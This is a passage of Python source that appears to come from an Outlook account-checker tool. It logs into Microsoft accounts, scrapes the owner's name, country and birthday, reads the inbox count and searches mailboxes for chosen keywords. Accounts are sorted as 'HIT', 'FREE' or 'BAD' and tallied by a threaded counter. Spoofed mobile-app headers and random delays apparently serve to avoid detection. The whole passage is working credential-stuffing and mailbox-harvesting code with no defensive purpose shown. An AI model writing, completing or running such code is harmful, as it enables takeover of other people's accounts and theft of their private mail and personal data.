                              d, m, y = data.get("birthDay", ""), data.get("birthMonth", ""), data.get("birthYear", "")
                              if d or m or y: self.captures["Birthday"] = f"{d}-{m}-{y}"
                          if self.captures.get("Name") or self.captures.get("Country"): return True
                      except Exception: pass
                  return False

              def get_inbox_count(self):
                  if not self.substrate_token: return 0
                  url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
                  headers = {"Host": "outlook.live.com", "content-length": "0", "x-owa-sessionid": self.coid, "x-req-source": "Mini", "authorization": f"Bearer {self.substrate_token}", "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36", "action": "StartupData", "x-owa-correlationid": self.coid, "ms-cv": "YizxQK73vePSyVZZXVeNr+.3", "content-type": "application/json; charset=utf-8", "accept": "*/*", "origin": "https://outlook.live.com", "x-requested-with": "com.microsoft.office.outlook", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://outlook.live.com/", "accept-encoding": "gzip, deflate", "accept-language": "en-US,en;q=0.9"}
                  time.sleep(random.uniform(0.1, 0.3))
                  try:
                      text = self.session.post(url, headers=headers, timeout=30).text
                      for pat in [r'DisplayName\\\":\\\"Inbox\\\",\\\"TotalCount\\\":(\\d+)', r'DisplayName":"Inbox","TotalCount":(\d+)', r'"Inbox".*?"TotalCount":(\d+)', r'TotalCount":(\d+).*?"Inbox"']:
                          match = re.search(pat, text)
                          if match:
                              total = int(match.group(1))
                              self.captures["Inbox"] = str(total)
                              return total
                  except Exception: pass
                  return 0

              def search_keyword(self, keyword):
                  if not self.substrate_token or not self.cid: return {"total": 0, "last_msg": ""}
                  url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                  payload = {"Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7", "Scenario": {"Name": "owa.react"}, "TimeZone": "Egypt Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": keyword}, "RefiningQueries": None, "Size": 25, "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True, "TopResultsCount": 3}], "AnswerEntityRequests": [{"Query": {"QueryString": keyword}, "EntityTypes": ["Event", "File"], "From": 0, "Size": 10, "EnableAsyncResolution": True}], "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]}, "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"}
                  headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {self.substrate_token}", "X-AnchorMailbox": f"CID:{self.cid}", "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
                  time.sleep(random.uniform(0.1, 0.2))
                  try:
                      data = self.session.post(url, json=payload, headers=headers, timeout=30).json()
                      total, last_msg, results = data.get("Total", 0), "", []
                      try:
                          es = data.get("EntitySets", [])
                          if es and es[0].get("ResultSets") and es[0]["ResultSets"][0].get("Results"):
                              results = es[0]["ResultSets"][0]["Results"]
                              if results: last_msg = results[0].get("ConversationTopic", "") or results[0].get("Preview", "") or results[0].get("Subject", "")
                      except Exception: pass
                      return {"total": max(total, len(results)), "last_msg": last_msg}
                  except Exception: return {"total": 0, "last_msg": ""}

              def search_keywords(self):
                  matches = {}
                  for kw in self.keywords:
                      if not kw.strip(): continue
                      res = self.search_keyword(kw.strip())
                      if res["total"] > 0: matches[kw.strip()] = res
                  return matches

              def run(self):
                  self.login()
                  if self.exchange_code_for_tokens():
                      self.refresh_substrate_token()
                      self.fetch_profile()
                      self.get_inbox_count()
                      if self.keywords:
                          matches = self.search_keywords()
                          return ("HIT", self.captures, matches) if matches else ("FREE", self.captures, {})
                      return "FREE", self.captures, {}
                  return "BAD", {}, {}

          class Stats:
              def __init__(self):
                  self.lock = threading.Lock()
                  self.total = self.hits = self.free = self.bad = self.retry = 0
                  self.start_time = time.time()
              def add(self, stat_type):
                  with self.lock:
                      self.total += 1
                      if stat_type == "hit": self.hits += 1
                      elif stat_type == "free": self.free += 1
                      elif stat_type == "bad": self.bad += 1
                      elif stat_type == "retry": self.retry += 1

